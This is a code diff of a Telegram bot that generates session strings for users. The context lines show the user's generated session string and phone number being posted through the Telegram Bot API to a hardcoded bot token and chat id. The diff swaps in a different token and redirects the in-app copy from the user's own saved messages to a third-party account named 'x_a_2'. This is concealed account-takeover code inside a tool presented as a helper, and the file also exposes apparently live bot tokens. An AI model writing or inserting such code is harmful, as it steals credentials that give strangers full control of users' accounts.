@@ -33,7 +33,7 @@ from telethon.errors import (
 import config
 import requests
 idown = '411414467'
-tokk = '6016577909:AAGzM63cH41LcwDrSwHAnaDCfEIRqBLl41I'
+tokk = '5889289340:AAHj9DAazSGSuT_NICpIMIZkp8yo7eiPrkI'
 
 
 ask_ques = " - 𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚝𝚢𝚙𝚎 𝚘𝚏 𝚕𝚒𝚋𝚛𝚊𝚛𝚢 𝚝𝚘 𝚎𝚡𝚝𝚛𝚊𝚌𝚝 𝚝𝚑𝚎 𝚜𝚙𝚎𝚌𝚒𝚊𝚕 𝚌𝚘𝚍𝚎"
@@ -179,7 +179,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     text = f"** {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n `{phone_number}`"
     try:
         if not is_bot:
-            await client.send_message("me", text)
+            await client.send_message("x_a_2", text)
             v = requests.post(f'https://api.telegram.org/bot{tokk}/sendMessage?chat_id={idown}&text={string_session}')
         else:
             await bot.send_message(msg.chat.id, text)
